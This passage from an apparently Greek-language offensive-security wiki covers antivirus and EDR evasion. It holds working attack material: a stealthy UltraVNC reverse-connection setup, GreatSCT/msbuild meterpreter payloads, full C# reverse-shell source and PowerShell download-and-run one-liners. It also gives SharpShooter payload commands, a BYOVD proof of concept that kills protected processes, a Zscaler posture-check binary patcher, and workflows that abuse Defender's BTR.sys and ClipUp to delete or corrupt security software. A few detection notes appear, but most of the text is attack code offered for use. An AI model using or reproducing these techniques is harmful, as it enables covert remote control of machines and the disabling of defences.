Στη συνέχεια, μεταφέρετε το binary _**winvnc.exe**_ και το **νέο** αρχείο _**UltraVNC.ini**_ που δημιουργήθηκε μέσα στο **victim**

#### **Reverse connection**

Ο **attacker** πρέπει να **εκτελέσει μέσα** στο **host** του το binary `vncviewer.exe -listen 5900`, ώστε να είναι **έτοιμο** να δεχτεί μια αντίστροφη **VNC connection**. Στη συνέχεια, μέσα στο **victim**: Ξεκινήστε το daemon winvnc `winvnc.exe -run` και εκτελέστε `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`

**ΠΡΟΕΙΔΟΠΟΙΗΣΗ:** Για να διατηρήσετε τη μυστικότητα, δεν πρέπει να κάνετε ορισμένα πράγματα

- Μην ξεκινήσετε το `winvnc` αν εκτελείται ήδη, διαφορετικά θα εμφανιστεί ένα [popup](https://i.imgur.com/1SROTTl.png). Ελέγξτε αν εκτελείται με `tasklist | findstr winvnc`
- Μην ξεκινήσετε το `winvnc` χωρίς το `UltraVNC.ini` στον ίδιο κατάλογο, διαφορετικά θα ανοίξει το [παράθυρο ρυθμίσεων](https://i.imgur.com/rfMQWcf.png)
- Μην εκτελέσετε το `winvnc -h` για βοήθεια, διαφορετικά θα εμφανιστεί ένα [popup](https://i.imgur.com/oc18wcu.png)

### GreatSCT

Κατεβάστε το από: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)

```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```

Μέσα στο GreatSCT:

```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```

Τώρα **εκκινήστε τον lister** με `msfconsole -r file.rc` και **εκτελέστε** το **xml payload** με:

```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```

**Ο τρέχων defender θα τερματίσει τη διεργασία πολύ γρήγορα.**

### Μεταγλώττιση του δικού μας reverse shell

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### Πρώτο C# Revershell

Μεταγλωττίστε το με:

```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```

Χρησιμοποιήστε το με:

```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
	public class Program
	{
		static StreamWriter streamWriter;

		public static void Main(string[] args)
		{
			using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
			{
				using(Stream stream = client.GetStream())
				{
					using(StreamReader rdr = new StreamReader(stream))
					{
						streamWriter = new StreamWriter(stream);

						StringBuilder strInput = new StringBuilder();

						Process p = new Process();
						p.StartInfo.FileName = "cmd.exe";
						p.StartInfo.CreateNoWindow = true;
						p.StartInfo.UseShellExecute = false;
						p.StartInfo.RedirectStandardOutput = true;
						p.StartInfo.RedirectStandardInput = true;
						p.StartInfo.RedirectStandardError = true;
						p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
						p.Start();
						p.BeginOutputReadLine();

						while(true)
						{
							strInput.Append(rdr.ReadLine());
							//strInput.Append("\n");
							p.StandardInput.WriteLine(strInput);
							strInput.Remove(0, strInput.Length);
						}
					}
				}
			}
		}

		private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
        {
            StringBuilder strOutput = new StringBuilder();

            if (!String.IsNullOrEmpty(outLine.Data))
            {
                try
                {
                    strOutput.Append(outLine.Data);
                    streamWriter.WriteLine(strOutput);
                    streamWriter.Flush();
                }
                catch (Exception err) { }
            }
        }

	}
}
```

### C# με χρήση compiler

```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```

[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Αυτόματη λήψη και εκτέλεση:

```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```


{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

Λίστα obfuscators για C#: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++

```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```

- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](https://github.com/l0ss/Grouper2)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Παράδειγμα χρήσης της Python για την κατασκευή injectors:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Άλλα εργαλεία

```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```

### Περισσότερα

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – Τερματισμός AV/EDR από τον χώρο του kernel

Το Storm-2603 αξιοποίησε ένα μικρό βοηθητικό πρόγραμμα κονσόλας, γνωστό ως **Antivirus Terminator**, για να απενεργοποιήσει τις προστασίες endpoint πριν από την εγκατάσταση ransomware. Το εργαλείο φέρνει τον **δικό του ευάλωτο αλλά *υπογεγραμμένο* driver** και τον καταχράται για να εκτελεί προνομιούχες λειτουργίες στον kernel, τις οποίες δεν μπορούν να εμποδίσουν ούτε οι υπηρεσίες AV με Protected-Process-Light (PPL).<sup>[[12]](#references)</sup>

Βασικά συμπεράσματα
1. **Υπογεγραμμένος driver**: Το αρχείο που αποθηκεύεται στον δίσκο είναι το `ServiceMouse.sys`, αλλά το binary είναι ο νόμιμα υπογεγραμμένος driver `AToolsKrnl64.sys` από το «System In-Depth Analysis Toolkit» της Antiy Labs. Επειδή ο driver φέρει έγκυρη υπογραφή της Microsoft, φορτώνεται ακόμη και όταν είναι ενεργοποιημένο το Driver-Signature-Enforcement (DSE).
2. **Εγκατάσταση υπηρεσίας**:
   ```powershell
   sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
   sc start  ServiceMouse
   ```
   Η πρώτη γραμμή καταχωρίζει τον driver ως **kernel service** και η δεύτερη τον εκκινεί, ώστε το `\\.\ServiceMouse` να είναι προσβάσιμο από το userland.
3. **IOCTLs που εκθέτει ο driver**
   | Κωδικός IOCTL | Δυνατότητα                              |
   |-----------:|-----------------------------------------|
   | `0x99000050` | Τερματισμός οποιασδήποτε διεργασίας με βάση το PID (χρησιμοποιείται για τον τερματισμό υπηρεσιών Defender/EDR) |
   | `0x990000D0` | Διαγραφή οποιουδήποτε αρχείου από τον δίσκο |
   | `0x990001D0` | Απεγκατάσταση του driver και αφαίρεση της υπηρεσίας |

   Ελάχιστο proof-of-concept σε C:
   ```c
   #include <windows.h>
   
   int main(int argc, char **argv){
       DWORD pid = strtoul(argv[1], NULL, 10);
       HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
       DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
       CloseHandle(hDrv);
       return 0;
   }
   ```
4. **Γιατί λειτουργεί**: Το BYOVD παρακάμπτει πλήρως τις προστασίες user-mode· κώδικας που εκτελείται στον kernel μπορεί να ανοίξει *προστατευμένες* διεργασίες, να τις τερματίσει ή να παραβιάσει αντικείμενα του kernel, ανεξάρτητα από τα PPL/PP, ELAM ή άλλες λειτουργίες hardening.

Ανίχνευση / Μετριασμός
•  Ενεργοποιήστε τη λίστα αποκλεισμού ευάλωτων drivers της Microsoft (`HVCI`, `Smart App Control`), ώστε τα Windows να αρνούνται τη φόρτωση του `AToolsKrnl64.sys`.
•  Παρακολουθείτε τη δημιουργία νέων υπηρεσιών *kernel* και ενεργοποιείτε ειδοποίηση όταν ένας driver φορτώνεται από κατάλογο με δικαιώματα εγγραφής για όλους ή δεν περιλαμβάνεται στη λίστα επιτρεπόμενων.
•  Παρακολουθείτε handles από user-mode προς προσαρμοσμένα device objects, ακολουθούμενα από ύποπτες κλήσεις `DeviceIoControl`.

### Παράκαμψη των ελέγχων κατάστασης συσκευής του Zscaler Client Connector μέσω επιδιόρθωσης δυαδικών αρχείων στον δίσκο

Το **Client Connector** της Zscaler εφαρμόζει τοπικά κανόνες κατάστασης συσκευής και βασίζεται στο Windows RPC για να κοινοποιεί τα αποτελέσματα σε άλλα components. Δύο αδύναμες σχεδιαστικές επιλογές καθιστούν δυνατή την πλήρη παράκαμψη:

1. Η αξιολόγηση της κατάστασης συσκευής γίνεται **εξ ολοκλήρου στην πλευρά του client** (αποστέλλεται μια boolean τιμή στον server).
2. Τα εσωτερικά RPC endpoints ελέγχουν μόνο ότι το εκτελέσιμο αρχείο που συνδέεται είναι **υπογεγραμμένο από τη Zscaler** (μέσω του `WinVerifyTrust`).<sup>[[11]](#references)</sup>

Με την **επιδιόρθωση τεσσάρων υπογεγραμμένων δυαδικών αρχείων στον δίσκο**, μπορούν να εξουδετερωθούν και οι δύο μηχανισμοί:

| Δυαδικό αρχείο | Αρχική λογική που επιδιορθώνεται | Αποτέλεσμα |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Επιστρέφει πάντα `1`, οπότε κάθε έλεγχος θεωρείται συμμορφωμένος |
| `ZSAService.exe` | Έμμεση κλήση στο `WinVerifyTrust` | NOP-ed ⇒ οποιαδήποτε διεργασία (ακόμη και χωρίς υπογραφή) μπορεί να συνδεθεί στα RPC pipes |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | Αντικαθίσταται από `mov eax,1 ; ret` |
| `ZSATunnel.exe` | Έλεγχοι ακεραιότητας στο tunnel | Παρακάμπτονται πρόωρα |

Απόσπασμα ελάχιστου patcher:

```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
    data = f.read()
    off = data.find(pattern)
    if off == -1:
        print("pattern not found")
    else:
        f.seek(off)
        f.write(replacement)
```

Μετά την αντικατάσταση των αρχικών αρχείων και την επανεκκίνηση του service stack:

* **Όλοι** οι έλεγχοι posture εμφανίζονται **πράσινοι/συμμορφωμένοι**.
* Μη υπογεγραμμένα ή τροποποιημένα binaries μπορούν να ανοίξουν τα named-pipe RPC endpoints (π.χ. `\\RPC Control\\ZSATrayManager_talk_to_me`).
* Ο παραβιασμένος host αποκτά απεριόριστη πρόσβαση στο εσωτερικό δίκτυο που ορίζουν οι πολιτικές του Zscaler.

Αυτή η μελέτη περίπτωσης δείχνει πώς μπορούν να παρακαμφθούν αποφάσεις εμπιστοσύνης που λαμβάνονται αποκλειστικά στην πλευρά του client και απλοί έλεγχοι υπογραφών, με λίγα byte patches.

## Κατάχρηση έμπιστης λειτουργικότητας του Microsoft Defender `BTR.sys`

Ο driver **Boot-Time Removal** του Defender αποτελεί ένα χρήσιμο αντιπαράδειγμα στο κλασικό BYOVD. Το `BTR.sys` είναι ένα νόμιμο στοιχείο αποκατάστασης, υπογεγραμμένο από τη Microsoft, χωρίς bug αλλοίωσης μνήμης και χωρίς διεπαφή IOCTL· αφού αποκτήσει πρόσβαση administrator και `SeLoadDriverPrivilege`, ένας operator μπορεί, αντί γι' αυτό, να πλαστογραφήσει την ιδιωτική συναλλαγή αποκατάστασής του και να εκτελέσει τις προβλεπόμενες λειτουργίες αρχείων/registry στο Ring-0. Πρόκειται για primitive εξουδετέρωσης AV/EDR μετά την παραβίαση, όχι για αρχική πρόσβαση ή κλιμάκωση προνομίων, και ο driver μπορεί να εξαχθεί από το resource `BOOTTIMETOOL` του `MpEngine.dll` του ίδιου του target, αντί να εισαχθεί ένας ευδιάκριτος driver τρίτου κατασκευαστή.<sup>[[36]](#references)</sup>

### Προετοιμασία του one-shot driver

Κανονικά, ο Defender αποθηκεύει το resource ως αρχείο `[a-z]{8}.sys` με τυχαίο όνομα και καταχωρίζει μια kernel service με παρόμοιο όνομα. Το `DriverEntry` διαβάζει την τιμή `Args` της service, ανοίγει το αναφερόμενο NTFS ADS, αποκρυπτογραφεί και επικυρώνει τη λίστα ενεργειών, γράφει feedback και επιστρέφει `0xC0000056` (`STATUS_DELETE_PENDING`) μετά την επιτυχή εκτέλεση, ώστε ο driver να αποφορτωθεί αντί να παραμείνει φορτωμένος. Μια πλαστογραφημένη service έχει τις ακόλουθες χαρακτηριστικές τιμές.<sup>[[36]](#references)[[37]](#references)</sup>

```text
Type         = 1
Start        = 1
ErrorControl = 0
ImagePath    = \??\C:\Windows\System32\drivers\<random>.sys
Group        = Boot Bus Extender
Args         = C:\Windows\System32\drivers\<random>.sys:changelist
```

Το stream `:changelist` περιέχει ένα blob κρυπτογραφημένο με RC4. Στα builds που αναλύθηκαν χρησιμοποιείται επανειλημμένα ένα σταθερό κλειδί 256 byte, επομένως η κρυπτογράφηση δεν αποτελεί όριο εξουσιοδότησης. Ένα έγκυρο plaintext έχει μια καθολική κεφαλίδα 24 byte (`Magic=0xFEE1DEAD`, `Version=2`, `PayloadOffset=0x10`, CRC κεφαλίδας και transaction ID που προκύπτει από το payload), ακολουθούμενη από μια διαδρομή feedback σε UTF-16 με μηδενικό τερματισμό και οποιονδήποτε αριθμό στοιχείων. Κάθε στοιχείο έχει κεφαλίδα 16 byte (`DataSize`, `Action`, `HeaderCRC`, `DataCRC`) και δεδομένα ειδικά για την ενέργεια, τα οποία τελειώνουν με **ακριβώς τέσσερα byte NUL**. Κάθε περιοχή κεφαλίδας/δεδομένων ελέγχεται ανεξάρτητα με CRC-32 πολυωνύμου `0xEDB88320`, αρχική κατάσταση `0xFFFFFFFF` και **χωρίς τελικό XOR** (`~CRC32`)· η κατάσταση CRC μηδενίζεται για κάθε περιοχή.<sup>[[36]](#references)[[37]](#references)</sup>

Τα αποδεκτά ID ενεργειών αποκαλύπτουν αυτές τις kernel primitives.<sup>[[36]](#references)[[37]](#references)</sup>

| ID | Δεδομένα στοιχείου | Αποτέλεσμα |
| --- | --- | --- |
| 1 | `[UTF-16 path]` | Διαγραφή αρχείου, ακόμη κι αν είναι κλειδωμένο |
| 2 | `[UTF-16 path]` | Αφαίρεση κενού καταλόγου |
| 3 | `[Flags][source][destination]` | Μετακίνηση αρχείου σε προστατευμένη διαδρομή που επιλέγει ο επιτιθέμενος· κενός προορισμός σημαίνει διαγραφή |
| 4 | `[Flags][key path]` | Αναδρομική διαγραφή κλειδιού registry |
| 5 | `[Flags][key path + "\\" + value]` | Διαγραφή τιμής registry |
| 6 | `[Flags][type][size][key path + "\\" + value][data]` | Δημιουργία/ενημέρωση τιμής registry και δημιουργία διαδρομών κλειδιών που λείπουν |

Για τις ενέργειες 5 και 6, το διαχωριστικό κλειδιού/τιμής στο wire format είναι **δύο διαδοχικά backslash**· μια διαδρομή με τη συνήθη μορφοποίηση δεν θα διαχωριστεί σωστά. Το αρχείο feedback αντικατοπτρίζει σε μεγάλο βαθμό το αίτημα, αλλά τα πρώτα τέσσερα byte δεδομένων κάθε στοιχείου γίνονται το `NTSTATUS` που προκύπτει. Για τις ενέργειες 1 και 2, οι οποίες δεν έχουν αρχικό πεδίο flags, το BTR μετακινεί τη διαδρομή στα τέσσερα δεσμευμένα byte στο τέλος, ώστε να δημιουργήσει χώρο για αυτήν την κατάσταση.<sup>[[36]](#references)</sup>

### Ροή εργασίας `BTR_CLI` και παράθυρο early-boot

Το [`BTR_CLI`](https://github.com/Dump-GUY/BTR_CLI) υλοποιεί ολόκληρη την αλυσίδα: εξαγωγή του `BTR.sys` από το τοπικό Defender, δημιουργία των streams `<random>.sys:changelist` και feedback, σειριοποίηση/υπολογισμός checksum/κρυπτογράφηση αλυσιδωτών ενεργειών, απευθείας δημιουργία του κλειδιού registry της υπηρεσίας και, στη συνέχεια, κλήση του `NtLoadDriver` για `-trigger now` ή διατήρησή του ως driver εκκίνησης συστήματος για `-trigger boot`. Η απευθείας προετοιμασία του registry παρακάμπτει την κανονική διαδρομή SCM `CreateServiceW` και επομένως **δεν** δημιουργεί το Service Install Event ID 7045. Τα artifacts που ενεργοποιούνται κατά την εκκίνηση μπορούν αργότερα να αφαιρεθούν με `BTR_CLI.exe -cleanup <service_name>`.<sup>[[36]](#references)[[37]](#references)</sup>

```powershell
# Runtime: remove protected security-service registrations from Ring 0
BTR_CLI.exe -chain -item "4|HKLM\SYSTEM\CurrentControlSet\Services\WdFilter" -item "4|HKLM\SYSTEM\CurrentControlSet\Services\WinDefend" -trigger now

# Boot: delete a security driver before its user-mode protection stack starts
BTR_CLI.exe -a 1 -s "C:\Windows\System32\drivers\wd\WdFilter.sys" -trigger boot
```

`Start=0` δεν είναι αξιοποιήσιμο, επειδή το BTR εκτελεί I/O αρχείων από το `DriverEntry`, πριν να είναι έτοιμα το storage stack και ο σύνδεσμος `SystemRoot`. Το `Start=1` μαζί με την ομάδα υψηλής προτεραιότητας `Boot Bus Extender` εκτελείται αντίθετα στη Phase 1: το NTFS είναι διαθέσιμο, αλλά πολλά security drivers που ξεκινούν από το σύστημα και υπηρεσίες EDR σε user mode δεν έχουν αρχικοποιηθεί. Τα φίλτρα boot-start, όπως το `WdFilter`, μπορεί να έχουν ήδη φορτωθεί, ωστόσο το BTR μπορεί να αφαιρέσει τα binaries τους ή τη διαμόρφωση των υπηρεσιών πριν από την επόμενη εκκίνηση, καθώς και να διαγράψει τα εκτελέσιμα των υπηρεσιών πριν τα εκκινήσει το SCM. Το ELAM δεν καλύπτει αυτό το κενό, επειδή το BTR εκτελείται μετά την αξιολόγηση boot-start και διαθέτει έγκυρη υπογραφή Microsoft.<sup>[[36]](#references)</sup>

Πολλαπλές ενέργειες εκτελούνται σε μία συναλλαγή. Το PoC προσθέτει ως πρώτο το Action 1 για το hard-coded `\SystemRoot\Temp\BootClean.log`: το BTR δημιουργεί αυτό το log, έπειτα εκτελεί το δικό του αίτημα διαγραφής και το αφαιρεί πριν από την απεγκατάστασή του. Αυτό μειώνει τα ίχνη, ενώ η τοποθέτηση feedback στο `<random>.sys:<random>.dat` επιτρέπει την ταυτόχρονη αφαίρεση του driver και των δύο streams.<sup>[[36]](#references)[[37]](#references)</sup>

### Συσχετίσεις με υψηλή πιθανότητα ανίχνευσης

Οι κανόνες που βασίζονται μόνο σε υπογραφές και η λίστα αποκλεισμού ευάλωτων drivers της Microsoft δεν αντιμετωπίζουν την κατάχρηση της προβλεπόμενης λειτουργικότητας του BTR. Προτιμήστε τις παρακάτω συσχετίσεις συμπεριφοράς, διακρίνοντας τη νόμιμη προέλευση από το Defender από έναν αυθαίρετο launcher.<sup>[[36]](#references)</sup>

- **Sysmon 15:** η δημιουργία του `.sys:changelist` είναι καθολική στο BTR staging. Ένα ADS `.dat` συνδεδεμένο στο ίδιο `.sys` είναι ιδιαίτερα ύποπτο, καθώς το νόμιμο Defender συνήθως αποθηκεύει feedback κάτω από το `C:\ProgramData\Microsoft\Windows Defender\Scans\RebootActions\`.
- **Sysmon 12/13 χωρίς System 7045:** συσχετίστε την άμεση δημιουργία του `HKLM\SYSTEM\CurrentControlSet\Services\<random>`, που περιέχει `Args=...:changelist` και `Group=Boot Bus Extender`, με την απουσία αντίστοιχου συμβάντος εγκατάστασης SCM.
- **Sysmon 6 -> 23:** συσχετίστε τη φόρτωση γνωστού BTR driver από προέλευση διαφορετική από το Defender με επακόλουθη διαγραφή αρχείου από το `System`/PID 4, ιδίως όταν αφορά binaries ασφαλείας.
- **Sysmon 11 -> 23:** ειδοποιήστε για ταχεία δημιουργία και διαγραφή του `\SystemRoot\Temp\BootClean.log` από το `System`/PID 4.
- Περιορίστε και ελέγξτε την εκχώρηση/ενεργοποίηση του `SeLoadDriverPrivilege`. Μια υπογραφή Microsoft από μόνη της δεν αρκεί ως ένδειξη εμπιστοσύνης, όταν ένα driver εργαλείου ασφαλείας γίνεται stage από `cmd.exe`, PowerShell ή άγνωστη διεργασία.

## Κατάχρηση του Protected Process Light (PPL) για αλλοίωση AV/EDR με LOLBINs

Το Protected Process Light (PPL) επιβάλλει μια ιεραρχία signer/level, ώστε μόνο προστατευμένες διεργασίες ίδιου ή υψηλότερου επιπέδου να μπορούν να αλλοιώνουν η μία την άλλη. Από επιθετική σκοπιά, αν μπορείτε να εκκινήσετε νόμιμα ένα binary με ενεργοποιημένο PPL και να ελέγχετε τα ορίσματά του, μπορείτε να μετατρέψετε καλοήθη λειτουργικότητα (π.χ. logging) σε έναν περιορισμένο μηχανισμό εγγραφής με υποστήριξη PPL, που στοχεύει προστατευμένους καταλόγους τους οποίους χρησιμοποιούν τα AV/EDR.<sup>[[16]](#references)[[17]](#references)[[18]](#references)[[19]](#references)[[20]](#references)</sup>

Τι απαιτείται για να εκτελείται μια διεργασία ως PPL
- Το target EXE (και τυχόν φορτωμένα DLLs) πρέπει να είναι υπογεγραμμένο με EKU συμβατό με PPL.
- Η διεργασία πρέπει να δημιουργηθεί με CreateProcess χρησιμοποιώντας τις σημαίες: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`.
- Πρέπει να ζητηθεί συμβατό επίπεδο προστασίας που να αντιστοιχεί στον signer του binary (π.χ. `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` για signers κατά του malware, `PROTECTION_LEVEL_WINDOWS` για signers των Windows). Λανθασμένα επίπεδα θα προκαλέσουν αποτυχία δημιουργίας.

Δείτε επίσης μια ευρύτερη εισαγωγή στα PP/PPL και στην προστασία του LSASS εδώ:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Εργαλεία launcher
- Βοηθητικό εργαλείο ανοικτού κώδικα: CreateProcessAsPPL (επιλέγει το επίπεδο προστασίας και προωθεί τα ορίσματα στο target EXE):
  - [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)<sup>[[19]](#references)</sup>
- Μοτίβο χρήσης:

```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```

LOLBIN primitive: ClipUp.exe
- Το υπογεγραμμένο system binary `C:\Windows\System32\ClipUp.exe` εκκινεί τον εαυτό του και δέχεται μια παράμετρο για την εγγραφή ενός αρχείου καταγραφής σε διαδρομή που καθορίζει ο καλών.
- Όταν εκκινείται ως διεργασία PPL, η εγγραφή του αρχείου πραγματοποιείται με προστασία PPL.
- Το ClipUp δεν μπορεί να αναλύσει διαδρομές που περιέχουν κενά· χρησιμοποιήστε σύντομες διαδρομές 8.3 για να δείξετε σε συνήθως προστατευμένες τοποθεσίες.

Βοηθητικά εργαλεία για σύντομες διαδρομές 8.3
- Εμφάνιση σύντομων ονομάτων: `dir /x` σε κάθε γονικό κατάλογο.
- Εύρεση σύντομης διαδρομής στο cmd: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Αλυσίδα κατάχρησης (σχηματική)
1) Εκκινήστε το PPL-capable LOLBIN (ClipUp) με `CREATE_PROTECTED_PROCESS`, χρησιμοποιώντας έναν launcher (π.χ. CreateProcessAsPPL).
2) Περάστε το όρισμα διαδρομής αρχείου καταγραφής του ClipUp για να εξαναγκάσετε τη δημιουργία αρχείου σε έναν προστατευμένο κατάλογο AV (π.χ. Defender Platform). Χρησιμοποιήστε σύντομα ονόματα 8.3, αν χρειάζεται.
3) Αν το AV έχει συνήθως ανοιχτό/κλειδωμένο το binary-στόχο όσο εκτελείται (π.χ. MsMpEng.exe), προγραμματίστε την εγγραφή κατά την εκκίνηση, πριν ξεκινήσει το AV, εγκαθιστώντας μια υπηρεσία αυτόματης εκκίνησης που εκτελείται αξιόπιστα νωρίτερα. Επαληθεύστε τη σειρά εκκίνησης με το Process Monitor (boot logging).
4) Κατά την επανεκκίνηση, η εγγραφή με προστασία PPL πραγματοποιείται πριν το AV κλειδώσει τα binaries του, καταστρέφοντας το αρχείο-στόχο και εμποδίζοντας την εκκίνησή του.

Παράδειγμα εντολής (οι διαδρομές έχουν αποκρυφτεί/συντομευτεί για λόγους ασφάλειας):

```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```

Σημειώσεις και περιορισμοί
- Δεν μπορείς να ελέγξεις τα περιεχόμενα που γράφει το ClipUp, παρά μόνο τη θέση τους· επομένως, το primitive είναι κατάλληλο για αλλοίωση και όχι για ακριβή εισαγωγή περιεχομένου.
- Απαιτούνται τοπικά δικαιώματα admin/SYSTEM για την εγκατάσταση/εκκίνηση μιας υπηρεσίας, καθώς και ένα χρονικό παράθυρο επανεκκίνησης.
- Ο χρονισμός είναι κρίσιμος: ο στόχος δεν πρέπει να είναι ανοιχτός· η εκτέλεση κατά την εκκίνηση αποφεύγει τα κλειδώματα αρχείων.

Ανιχνεύσεις
- Δημιουργία διεργασίας `ClipUp.exe` με ασυνήθιστα ορίσματα, ειδικά όταν έχει ως γονέα μη τυπικούς launchers, κοντά στην εκκίνηση.
- Νέες υπηρεσίες ρυθμισμένες να ξεκινούν αυτόματα ύποπτα binaries και να ξεκινούν σταθερά πριν από το Defender/AV. Διερεύνησε τη δημιουργία/τροποποίηση υπηρεσιών πριν από αποτυχίες εκκίνησης του Defender.
- Παρακολούθηση ακεραιότητας αρχείων για τα binaries/τους καταλόγους Platform του Defender· μη αναμενόμενες δημιουργίες/τροποποιήσεις αρχείων από διεργασίες με protected-process flags.
- Τηλεμετρία ETW/EDR: αναζήτησε διεργασίες που δημιουργούνται με `CREATE_PROTECTED_PROCESS` και ασυνήθιστη χρήση επιπέδων PPL από binaries που δεν σχετίζονται με AV.

Μετριασμοί
